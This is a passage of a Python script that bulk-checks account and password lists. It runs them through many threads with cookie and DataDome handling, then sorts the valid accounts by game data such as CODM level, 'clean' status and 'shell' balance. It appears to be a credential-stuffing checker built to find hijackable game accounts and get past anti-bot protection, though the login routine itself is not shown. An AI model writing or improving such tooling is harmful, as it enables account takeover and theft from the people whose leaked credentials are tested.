    console.print(Align.center(Panel(f"Loaded [green]{total}[/green] accounts", border_style=COLOR_BORDER, box=box.HEAVY, width=70)))
    console.print()

    results_manager = ResultsManager(selected_file)
    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    num_threads = 15
    console.print(Align.center(Panel("Running with [cyan]Multiple Threads[/cyan]", border_style=COLOR_ACCENT, box=box.HEAVY, width=70)))
    console.print()

    shutdown_event = threading.Event()
    def signal_handler(sig, frame):
        console.print("\n[yellow]⚠️  Ctrl+C detected — stopping...[/yellow]")
        shutdown_event.set()
    import signal
    signal.signal(signal.SIGINT, signal_handler)

    completed = 0
    valid_count = 0
    invalid_count = 0
    has_codm_count = 0
    no_codm_count = 0
    clean_count = 0
    not_clean_count = 0
    highest_clean_level = 0
    highest_not_clean_level = 0
    highest_shell = 0
    categorized_levels = {"1-49": 0, "50-99": 0, "100-199": 0, "200-299": 0, "300-400": 0}
    countries = []

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = {}
        for acc, pwd in accounts:
            if shutdown_event.is_set():
                break
            future = executor.submit(
                processaccount,
                None, acc, pwd, cookie_manager, datadome_manager,
                results_manager, file_manager, selected_file, auto_remove, shutdown_event
            )
            futures[future] = (acc, pwd)

        for future in as_completed(futures):
            if shutdown_event.is_set():
                for f in futures:
                    f.cancel()
                break
            try:
                result, stats = future.result(timeout=30)
            except Exception as e:
                acc, pwd = futures[future]
                result = f"{SOFT_RED}Error processing {acc}: {e}{RESET}"
                stats = {'valid': False, 'error_reason': 'Exception'}

            print(result)
            sys.stdout.flush()
            completed += 1
            print(f"{DIM}Progress: {completed}/{total} accounts checked{RESET}")
            print()

            if stats.get('valid'):
                valid_count += 1
                if stats.get('has_codm'):
                    has_codm_count += 1
                    lvl = stats.get('level', 0)
                    if lvl > highest_clean_level:
                        highest_clean_level = lvl
                    if lvl <= 49:
                        categorized_levels["1-49"] += 1
                    elif lvl <= 99:
                        categorized_levels["50-99"] += 1
                    elif lvl <= 199:
                        categorized_levels["100-199"] += 1
                    elif lvl <= 299:
                        categorized_levels["200-299"] += 1
                    else:
                        categorized_levels["300-400"] += 1
                else:
                    no_codm_count += 1
                if stats.get('clean'):
                    clean_count += 1
                else:
                    not_clean_count += 1
                shell_val = stats.get('shell', 0)
                if shell_val > highest_shell:
                    highest_shell = shell_val
            else:
                invalid_count += 1

    total_checked = valid_count + invalid_count
    failed = invalid_count

    display_summary(
        total_checked=total_checked,
        failed=failed,
        valid=valid_count,
        categorized_levels=categorized_levels,
        countries=countries,
        original_total=total,
        highest_clean=highest_clean_level,
        highest_not_clean=highest_not_clean_level,
        highest_shells=highest_shell
    )

    print(f"\n{SOFT_GREEN}Checking completed!{RESET} Results saved in 'Results' folder.")
    input(f"{DIM}Press Enter to exit...{RESET}")

def main():
    if os.name == 'nt':
        os.system('color')
    try:
        bulk_check()
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️  Script terminated by user[/yellow]")
    except Exception as e:
        console.print(f"[red]❌ Unexpected error: {e}[/red]")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()